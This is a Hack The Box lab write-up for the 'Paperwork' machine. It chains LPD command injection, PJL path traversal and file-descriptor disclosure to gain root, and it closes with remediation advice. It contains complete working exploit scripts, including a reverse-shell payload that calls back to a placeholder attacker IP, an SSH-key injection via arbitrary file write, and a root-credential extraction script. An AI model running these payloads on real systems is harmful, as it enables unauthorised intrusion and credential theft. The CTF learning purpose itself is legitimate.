# Paperwork — Hack The Box Write-Up

## Overview

**Machine:** Paperwork  
**Platform:** Linux  
**Difficulty:** Easy (I would say Medium)
**Initial access:** OS command injection in a custom LPD service  
**User access:** PJL path traversal and arbitrary file write  
**Privilege escalation:** Privileged file-descriptor disclosure over a Unix socket

This machine followed a clear multi-stage attack path centred around legacy printing protocols:

```text
Web source disclosure
        ↓
LPD command injection
        ↓
Shell as lp
        ↓
Internal JetDirect/PJL service
        ↓
Arbitrary file read and write as archivist
        ↓
SSH access as archivist
        ↓
SCM_RIGHTS file-descriptor disclosure
        ↓
Root password disclosure
        ↓
Root access
```

> Flags, passwords, public keys and attacker IP addresses have been redacted.

---

# 1. Reconnaissance

## Port Scan

Initial Nmap scanning identified two notable services:

```text
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
```

The HTTP service redirected to:

```text
http://paperwork.htb/
```

The port 1515 service returned:

```text
Archive_Printer is ready and printing.
```

The hostname was added locally:

```bash
echo '<TARGET_IP> paperwork.htb' | sudo tee -a /etc/hosts
```

Example Nmap commands:

```bash
nmap -p- --min-rate 5000 -oN all-ports.txt <TARGET_IP>
```

```bash
nmap -sC -sV -p80,1515 -oN targeted.txt <TARGET_IP>
```

---

# 2. Web Enumeration

The website displayed a maintenance advisory for a legacy printer gateway:

```text
Maintenance Advisory:
Backend spooler PRN-ARCHIVE-01 management console is currently offline.
Manual ingestion remains active via the legacy gateway.

Protocol: RFC 1179
Target Queue: archive_intake
Internal Processor: paperwork-archive-v1.02
```

The internal processor was linked to a downloadable Python file named:

```text
server.py
```

This source disclosure revealed the implementation of the custom Line Printer Daemon service.

---

# 3. LPD Source-Code Analysis

The relevant job-handling code was:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()

    if queue not in VALID_QUEUE:
        self.sock.send(b'\x01')
        return

    while True:
        chunk = self.sock.recv(1024)

        if not chunk:
            break

        subcommand = chunk[0]
        self.sock.send(b'\x00')

        parts = chunk[1:].decode(errors='ignore').split()

        if not parts:
            continue

        size = int(parts[0])
        content = b""

        while len(content) < size:
            content += self.sock.recv(size - len(content) + 1)

        decoded_content = content.decode(errors='ignore')

        job_name = "Unknown"

        for line in decoded_content.split('\n'):
            line = line.strip()

            if line.startswith('J'):
                job_name = line[1:]
                break

        subprocess.Popen(
            f"echo 'Archive: {job_name}' >> /tmp/archive.log",
            shell=True
        )
```

The application extracted the print job name from the `J` control-file field and inserted it directly into a shell command.

The vulnerable sink was:

```python
subprocess.Popen(
    f"echo 'Archive: {job_name}' >> /tmp/archive.log",
    shell=True
)
```

Because `job_name` was attacker-controlled and `shell=True` was enabled, shell metacharacters could escape the intended `echo` command.

---

# 4. Vulnerability: OS Command Injection

A job name such as:

```bash
'; id > /tmp/lpd-proof; #
```

would produce an executed command similar to:

```bash
echo 'Archive: '; id > /tmp/lpd-proof; #' >> /tmp/archive.log
```

The payload components were:

```text
'   Close the existing single-quoted string
;   Terminate the intended echo command
#   Comment out the remaining original command
```

A reverse-shell payload could therefore be used:

```bash
'; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"; #
```

---

# 5. Custom LPD Exploit

The following Python script implemented the required subset of RFC 1179 and submitted a malicious LPD control file.

## `lpd_exploit.py`

```python
#!/usr/bin/env python3

import socket
import sys
import time


def receive_ack(sock: socket.socket, description: str) -> None:
    response = sock.recv(1)

    if response == b"\x00":
        print(f"[+] {description}: accepted")

    elif response == b"\x01":
        print(f"[-] {description}: rejected")
        sys.exit(1)

    else:
        print(f"[?] {description}: unexpected response {response!r}")
        sys.exit(1)


def main() -> None:
    if len(sys.argv) != 4:
        print(
            f"Usage: {sys.argv[0]} "
            "<target> <attacker_ip> <attacker_port>"
        )
        sys.exit(1)

    target = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    queue = "archive_intake"

    job_name = (
        f"'; bash -c \"bash -i >& /dev/tcp/"
        f"{attacker_ip}/{attacker_port} 0>&1\"; #"
    )

    control_file = (
        "Hlocalhost\n"
        "Pguest\n"
        f"J{job_name}\n"
        "Ndocument.txt\n"
    ).encode()

    print(f"[*] Connecting to {target}:1515")

    with socket.create_connection((target, 1515), timeout=10) as sock:
        # RFC 1179 command 0x02: receive a printer job.
        sock.sendall(b"\x02" + queue.encode() + b"\n")
        receive_ack(sock, "Queue request")

        # RFC 1179 subcommand 0x02: receive control file.
        control_header = (
            b"\x02"
            + str(len(control_file)).encode()
            + b" cfA001localhost\n"
        )

        sock.sendall(control_header)
        receive_ack(sock, "Control-file request")

        # Control-file data followed by a NUL byte.
        sock.sendall(control_file + b"\x00")

        print("[+] Malicious control file sent")
        print("[*] Check the reverse-shell listener")

        time.sleep(2)


if __name__ == "__main__":
    main()
```

Start a listener:

```bash
nc -lvnp 4444
```

Run the exploit:

```bash
python3 lpd_exploit.py paperwork.htb <ATTACKER_IP> 4444
```

A reverse shell was received as:

```text
uid=7(lp) gid=7(lp) groups=7(lp)
```

---

# 6. Shell Stabilisation

The initial shell was upgraded using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Suspend the shell:

```text
Ctrl+Z
```

Configure the local terminal:

```bash
stty raw -echo; fg
```

Press Enter, then configure the remote environment:

```bash
export TERM=xterm-256color
stty rows 40 columns 120
```

Basic enumeration:

```bash
id
whoami
hostname
uname -a
pwd
ls -la
```

---

# 7. Local Enumeration as `lp`

Local enumeration identified another user:

```bash
grep -E 'bash$' /etc/passwd
```

Output:

```text
root:x:0:0:root:/root:/bin/bash
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

A process owned by `archivist` was also identified:

```bash
ps -u archivist -f
```

Output:

```text
/usr/bin/python3 /home/archivist/printer/jetdirect.py \
9100 \
/home/archivist/printer/ \
/home/archivist/printer/logs/commands.log
```

The service listened only on localhost:

```bash
ss -lnt | grep 9100
```

Output:

```text
LISTEN 0 100 127.0.0.1:9100 0.0.0.0:*
```

The service definition confirmed that it ran as `archivist`:

```bash
cat /etc/systemd/system/jetdirect.service
```

```ini
[Unit]
Description=jetdirect server
After=jetdirect.service
Requires=jetdirect.service

[Service]
Type=simple
User=archivist
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

This suggested that exploiting the localhost printer service would allow access under the `archivist` account.

---

# 8. PJL Service Enumeration

The internal service implemented parts of the Printer Job Language protocol.

The following commands were recognised:

```text
FSQUERY
FSDIRLIST
FSUPLOAD
FSDOWNLOAD
INFO ID
INFO FILESYS
ECHO
```

A reusable client was created to enumerate directories and retrieve files.

## `pjl_client.py`

```python
#!/usr/bin/env python3

import argparse
import socket
import sys


def send_pjl_command(
    host: str,
    port: int,
    command: str,
    timeout: float = 3.0,
) -> bytes:
    payload = f"@PJL {command}\r\n".encode()
    response = bytearray()

    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)
        sock.settimeout(timeout)

        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break

            if not chunk:
                break

            response.extend(chunk)

    return bytes(response)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Interact with the Paperwork JetDirect PJL service."
    )

    parser.add_argument(
        "action",
        choices=("query", "read"),
        help="query lists a path; read retrieves a file",
    )

    parser.add_argument(
        "path",
        help='PJL path, for example "0:/" or "0:/../user.txt"',
    )

    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="JetDirect host",
    )

    parser.add_argument(
        "--port",
        type=int,
        default=9100,
        help="JetDirect port",
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=3.0,
        help="Socket timeout",
    )

    args = parser.parse_args()

    if args.action == "query":
        command = f'FSQUERY NAME="{args.path}"'
    else:
        command = f'FSUPLOAD NAME="{args.path}"'

    try:
        response = send_pjl_command(
            args.host,
            args.port,
            command,
            args.timeout,
        )
    except OSError as exc:
        print(f"[-] Connection failed: {exc}", file=sys.stderr)
        sys.exit(1)

    if not response:
        print("[-] The service returned no data.", file=sys.stderr)
        sys.exit(1)

    sys.stdout.buffer.write(response)

    if not response.endswith(b"\n"):
        print()


if __name__ == "__main__":
    main()
```

Enumerate the virtual root:

```bash
python3 pjl_client.py query '0:/'
```

Example response:

```text
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```

Enumerate the parent directory:

```bash
python3 pjl_client.py query '0:/..'
```

Example response:

```text
. TYPE=DIR
.. TYPE=DIR
.cache TYPE=DIR SIZE=4096
.bashrc TYPE=FILE SIZE=3771
.local TYPE=DIR SIZE=4096
.ssh TYPE=DIR SIZE=4096
.profile TYPE=FILE SIZE=807
.lesshst TYPE=FILE SIZE=20
.bash_history TYPE=FILE SIZE=0
user.txt TYPE=FILE SIZE=33
.bash_logout TYPE=FILE SIZE=220
.gnupg TYPE=DIR SIZE=4096
printer TYPE=DIR SIZE=4096
```

This confirmed that directory traversal was possible.

---

# 9. Vulnerability: PJL Path Traversal

The JetDirect source code was retrieved using:

```bash
python3 pjl_client.py read '0:/jetdirect.py'
```

The vulnerable path translation was:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = (
            path.replace("0:", "")
            .replace("\\", "/")
            .lstrip("/")
        )

        return os.path.normpath(
            os.path.join(self._root, clean)
        )
```

The configured root was:

```text
/home/archivist/printer/
```

The code normalised the path, but did not verify that the resulting path remained inside the configured root.

For example:

```text
0:/../user.txt
```

resolved to:

```text
/home/archivist/user.txt
```

A secure implementation should have verified the resolved path:

```python
target = os.path.abspath(
    os.path.join(self._root, clean)
)

if os.path.commonpath([self._root, target]) != self._root:
    raise ValueError("Path escapes filesystem root")
```

---

# 10. Arbitrary File Read

The service implemented `FSUPLOAD` as a file-read operation:

```python
def handle_upload(command):
    m = re.search(
        r'NAME\s*=\s*"([^"]+)"',
        command,
        re.I
    )

    if not m:
        return "FILEERROR=1"

    path = m.group(1)
    data = fs.read(path)

    if data is None:
        return "FILEERROR=1"

    header = (
        f'@PJL FSUPLOAD NAME="{path}" '
        f'SIZE={len(data)}\n'
    ).encode("utf-8")

    return header + data
```

The user flag was retrieved with:

```bash
python3 pjl_client.py read '0:/../user.txt'
```

Response:

```text
@PJL FSUPLOAD NAME="0:/../user.txt" SIZE=33
<REDACTED_USER_FLAG>
```

This confirmed arbitrary file read under the security context of `archivist`.

---

# 11. Arbitrary File Write

The service implemented `FSDOWNLOAD` as a file-write operation:

```python
def handle_download(command, client):
    m = re.search(
        r'NAME\s*=\s*"([^"]+)"\s*'
        r'SIZE\s*=\s*(\d+)',
        command,
        re.I
    )

    if not m:
        return "FILEERROR=1"

    path = m.group(1)
    size = int(m.group(2))

    data = b""

    while len(data) < size:
        chunk = client._client.recv(
            min(size - len(data), 4096)
        )

        if not chunk:
            break

        data += chunk

    return fs.write(path, data)
```

The same vulnerable translation function was used for writes.

This allowed an attacker to overwrite:

```text
/home/archivist/.ssh/authorized_keys
```

using the traversal path:

```text
0:/../.ssh/authorized_keys
```

---

# 12. Custom PJL File-Upload Script

## `pjl_upload.py`

```python
#!/usr/bin/env python3

import argparse
import socket
import sys
from pathlib import Path


def upload_file(
    source: Path,
    destination: str,
    host: str = "127.0.0.1",
    port: int = 9100,
    timeout: float = 5.0,
) -> bytes:
    data = source.read_bytes()

    command = (
        f'@PJL FSDOWNLOAD '
        f'NAME="{destination}" '
        f'SIZE={len(data)}\r\n'
    ).encode()

    response = bytearray()

    with socket.create_connection(
        (host, port),
        timeout=timeout,
    ) as sock:
        sock.sendall(command)
        sock.sendall(data)
        sock.shutdown(socket.SHUT_WR)
        sock.settimeout(timeout)

        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break

            if not chunk:
                break

            response.extend(chunk)

    return bytes(response)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Upload a file through the PJL service."
    )

    parser.add_argument(
        "source",
        type=Path,
        help="Local source file",
    )

    parser.add_argument(
        "destination",
        help="Remote PJL destination path",
    )

    parser.add_argument(
        "--host",
        default="127.0.0.1",
    )

    parser.add_argument(
        "--port",
        type=int,
        default=9100,
    )

    args = parser.parse_args()

    if not args.source.is_file():
        print(
            f"[-] Source file not found: {args.source}",
            file=sys.stderr,
        )
        sys.exit(1)

    try:
        response = upload_file(
            source=args.source,
            destination=args.destination,
            host=args.host,
            port=args.port,
        )
    except OSError as exc:
        print(f"[-] Upload failed: {exc}", file=sys.stderr)
        sys.exit(1)

    print(response.decode(errors="replace"), end="")

    if response.startswith(b"OK"):
        print(
            f"[+] Uploaded {args.source} "
            f"to {args.destination}"
        )
    else:
        print(
            "[-] Service did not return OK.",
            file=sys.stderr,
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

# 13. SSH Access as `archivist`

An SSH key pair was generated on the attacking machine:

```bash
ssh-keygen -t ed25519 -f archivist_key -N ''
```

The public key was transferred to the target:

```bash
cat archivist_key.pub
```

On the target:

```bash
cat > /tmp/archivist_key.pub <<'EOF'
<ATTACKER_PUBLIC_KEY>
EOF
```

The key was written through the PJL service:

```bash
python3 pjl_upload.py \
  /tmp/archivist_key.pub \
  '0:/../.ssh/authorized_keys'
```

Expected response:

```text
OK
[+] Uploaded /tmp/archivist_key.pub to 0:/../.ssh/authorized_keys
```

The write was verified:

```bash
python3 pjl_client.py read \
  '0:/../.ssh/authorized_keys'
```

SSH access was then established:

```bash
chmod 600 archivist_key
ssh -i archivist_key archivist@paperwork.htb
```

Identity:

```bash
id
```

```text
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
```

---

# 14. Privilege-Escalation Enumeration

The `archivist` account did not have access to `sudo`.

However, a custom root-owned daemon was readable:

```bash
cat /usr/bin/paperwork-daemon
```

The daemon opened a root-only credential file during startup:

```python
admin_fd = os.open(
    "/etc/paperwork/admin_pins.conf",
    os.O_RDONLY
)
```

It monitored:

```text
/home/archivist/printer/logs/commands.log
```

for the following strings:

```python
["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]
```

If one was detected, it opened the command log and sent both open file descriptors over a Unix socket:

```python
evidence_bundle = array.array(
    "i",
    [log_fd, admin_fd]
)

conn.sendmsg(
    [msg],
    [
        (
            socket.SOL_SOCKET,
            socket.SCM_RIGHTS,
            evidence_bundle
        )
    ]
)
```

The socket was:

```text
/run/paperwork/mgmt.sock
```

Its permissions allowed the `archivist` group to connect:

```bash
ls -l /run/paperwork/mgmt.sock
```

```text
srw-rw---- 1 root archivist ... /run/paperwork/mgmt.sock
```

---

# 15. Vulnerability: Privileged File-Descriptor Disclosure

The daemon used `SCM_RIGHTS` to pass open file descriptors between Unix processes.

Normally, `archivist` could not open:

```text
/etc/paperwork/admin_pins.conf
```

However, the root daemon had already opened the file successfully.

When the daemon transferred the open file descriptor to an `archivist` process, no new filesystem permission check was performed.

The receiving process could therefore read the root-only file through the inherited descriptor.

The vulnerability required:

1. Triggering the malicious-log condition.
    
2. Connecting to the management socket.
    
3. Receiving ancillary data with `recvmsg()`.
    
4. Extracting the descriptors from `SCM_RIGHTS`.
    
5. Reading the transferred root-owned descriptor.
    

---

# 16. Trigger and File-Descriptor Receiver

## `trigger_and_receive.py`

```python
#!/usr/bin/env python3

import array
import os
import socket
import time


JETDIRECT_HOST = "127.0.0.1"
JETDIRECT_PORT = 9100
MGMT_SOCKET = "/run/paperwork/mgmt.sock"


def trigger_security_condition() -> None:
    payload = b'@PJL FSQUERY NAME="0:/"\r\n'

    with socket.create_connection(
        (JETDIRECT_HOST, JETDIRECT_PORT),
        timeout=3,
    ) as printer:
        printer.sendall(payload)
        printer.shutdown(socket.SHUT_WR)
        printer.settimeout(1)

        try:
            while printer.recv(4096):
                pass
        except (socket.timeout, OSError):
            pass


def receive_descriptors() -> tuple[bytes, list[int]]:
    sock = socket.socket(
        socket.AF_UNIX,
        socket.SOCK_STREAM,
    )

    sock.connect(MGMT_SOCKET)

    fd_item_size = array.array("i").itemsize

    message, ancillary, _, _ = sock.recvmsg(
        4096,
        socket.CMSG_SPACE(2 * fd_item_size),
    )

    sock.close()

    received_fds: list[int] = []

    for level, message_type, data in ancillary:
        if (
            level == socket.SOL_SOCKET
            and message_type == socket.SCM_RIGHTS
        ):
            fds = array.array("i")

            usable_length = (
                len(data)
                - (len(data) % fd_item_size)
            )

            fds.frombytes(data[:usable_length])
            received_fds.extend(fds.tolist())

    return message, received_fds


def read_descriptor(fd: int) -> bytes:
    os.lseek(fd, 0, os.SEEK_SET)

    content = bytearray()

    while True:
        chunk = os.read(fd, 4096)

        if not chunk:
            break

        content.extend(chunk)

    return bytes(content)


def main() -> None:
    trigger_security_condition()

    # Allow the log handler to flush the command.
    time.sleep(0.2)

    message, received_fds = receive_descriptors()

    print(
        f"[+] Message: "
        f"{message.decode(errors='replace')}"
    )

    print(
        f"[+] Received "
        f"{len(received_fds)} descriptor(s)"
    )

    for index, fd in enumerate(received_fds, start=1):
        print(f"\n--- Descriptor {index} ---")

        try:
            content = read_descriptor(fd)
            print(content.decode(errors="replace"))

        finally:
            os.close(fd)


if __name__ == "__main__":
    main()
```

Run the script:

```bash
python3 trigger_and_receive.py
```

Expected response:

```text
[+] Message:
ALERT: SECURITY_VIOLATION.
FORENSIC_CONTEXT_ATTACHED.

[+] Received 2 descriptor(s)
```

The descriptors were sent in this order:

```python
[log_fd, admin_fd]
```

Therefore:

```text
Descriptor 1:
  /home/archivist/printer/logs/commands.log

Descriptor 2:
  /etc/paperwork/admin_pins.conf
```

The second descriptor disclosed:

```text
ADMIN_PASSWORD=<REDACTED_ROOT_PASSWORD>
```

---

# 17. Root Access

The disclosed administrator password was reused as the root account password.

Privilege escalation was completed using:

```bash
su -
```

The recovered password was entered when prompted.

Root access was confirmed:

```bash
id
whoami
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
root
```

The root flag was retrieved:

```bash
cat /root/root.txt
```

```text
<REDACTED_ROOT_FLAG>
```

---

# 18. Complete Attack Path

```text
1. Nmap identified HTTP on port 80 and a custom LPD service
   on port 1515.

2. The website disclosed the LPD server source code and valid
   queue name.

3. The LPD service inserted a user-controlled job name into a
   shell command with shell=True.

4. A malicious RFC 1179 control file produced command execution
   and a reverse shell as lp.

5. Local enumeration identified a JetDirect/PJL service listening
   on 127.0.0.1:9100 and running as archivist.

6. FSQUERY enumerated the service's virtual filesystem.

7. The path translation function accepted ../ traversal and did
   not enforce the configured filesystem root.

8. FSUPLOAD was used to read /home/archivist/user.txt.

9. FSDOWNLOAD was used to write an attacker-controlled SSH public
   key to /home/archivist/.ssh/authorized_keys.

10. SSH access was established as archivist.

11. A root-owned management daemon was found to pass privileged
    file descriptors through /run/paperwork/mgmt.sock.

12. A PJL filesystem command triggered the daemon's lockdown
    routine.

13. recvmsg() received the SCM_RIGHTS ancillary data.

14. The transferred descriptor exposed the root-only
    admin_pins.conf file.

15. The recovered administrator password was reused for the root
    account.

16. su - provided full root access.
```

---

# 19. Confirmed Vulnerabilities

## Source-Code Disclosure

The website exposed the implementation of the backend LPD service.

### Impact

- Revealed the valid queue name
    
- Revealed the command parser
    
- Revealed the vulnerable shell invocation
    
- Significantly reduced exploitation complexity
    

---

## OS Command Injection

Attacker-controlled LPD job metadata was inserted into a shell command with `shell=True`.

### Impact

- Unauthenticated remote command execution
    
- Initial foothold as `lp`
    
- Access to localhost-only services
    

### Recommended remediation

Avoid `shell=True`:

```python
with open("/tmp/archive.log", "a") as log:
    log.write(f"Archive: {job_name}\n")
```

If an external process must be invoked, use a list of fixed arguments:

```python
subprocess.run(
    ["/usr/bin/some-command", job_name],
    shell=False,
    check=True,
)
```

---

## Improper Queue Validation

The queue was validated using:

```python
if queue not in VALID_QUEUE:
```

If `VALID_QUEUE` is a string, this performs substring matching.

### Recommended remediation

```python
if queue != VALID_QUEUE:
```

---

## PJL Path Traversal

The virtual filesystem normalised paths without checking that the result remained under the configured root.

### Impact

- Arbitrary file read as `archivist`
    
- Arbitrary file write as `archivist`
    
- Disclosure of the user flag
    
- Modification of SSH authentication files
    
- Lateral movement from `lp` to `archivist`
    

### Recommended remediation

```python
def _translate(self, path):
    clean = (
        path.replace("0:", "")
        .replace("\\", "/")
        .lstrip("/")
    )

    target = os.path.abspath(
        os.path.join(self._root, clean)
    )

    if os.path.commonpath(
        [self._root, target]
    ) != self._root:
        raise ValueError("Invalid path")

    return target
```

Additional controls should include:

- Rejecting `..` path components
    
- Restricting permitted files
    
- Avoiding arbitrary file-write functionality
    
- Running the service under a dedicated account
    
- Applying filesystem sandboxing
    

---

## Arbitrary File Read

`FSUPLOAD` allowed arbitrary files to be returned to the network client.

### Impact

- Sensitive-file disclosure
    
- Source-code disclosure
    
- Credential and key theft
    
- User-flag disclosure
    

---

## Arbitrary File Write

`FSDOWNLOAD` allowed attacker-controlled data to be written to arbitrary paths.

### Impact

- SSH key injection
    
- Configuration tampering
    
- Persistence
    
- Potential code execution as the service user
    

---

## Unsafe Privileged File-Descriptor Transfer

A root process sent a descriptor for a root-only credential file to the `archivist` group.

### Impact

- Root credential disclosure
    
- Full privilege escalation
    
- Bypass of filesystem access controls
    

### Recommended remediation

Never send unrelated privileged descriptors to less-privileged clients.

The evidence bundle should have contained only the intended log descriptor:

```python
evidence_bundle = array.array(
    "i",
    [log_fd]
)
```

Additional controls should include:

- Strictly validating each descriptor before transfer
    
- Avoiding long-lived descriptors for sensitive files
    
- Returning sanitised data rather than raw descriptors
    
- Separating monitoring and credential-management functionality
    
- Restricting socket access to trusted administrative processes
    

---

## Root Password Reuse

The disclosed administrative application password was also accepted as the operating-system root password.

### Impact

- Direct root compromise following application-secret disclosure
    

### Recommended remediation

- Use unique credentials for each security boundary
    
- Disable direct root password authentication
    
- Use individual administrative accounts
    
- Require `sudo` with auditing and least privilege
    
- Store application secrets outside reusable system credentials
    

---

# 20. Lessons Learned

This machine demonstrated how multiple moderate weaknesses can form a complete compromise chain.

The initial command injection provided only a restricted printing-service account. That account could not directly read the user flag or administrative secrets.

However, the foothold exposed a localhost-only service that trusted PJL filesystem paths. That service acted as a confused deputy: requests originated from `lp`, but file operations were performed as `archivist`.

The final escalation used the same principle at a lower operating-system level. The root daemon legitimately opened a sensitive file, but then transferred the resulting descriptor to a less-privileged user. Once a descriptor has been opened and transferred, normal pathname permissions no longer prevent the receiving process from reading it.

The complete compromise depended on three trust-boundary failures:

```text
Untrusted print metadata
        ↓
Trusted shell execution

Untrusted PJL paths
        ↓
Trusted archivist filesystem access

Untrusted socket client
        ↓
Trusted root-opened file descriptor
```

Each stage allowed a less-privileged actor to make a more-privileged component perform an unsafe action on its behalf.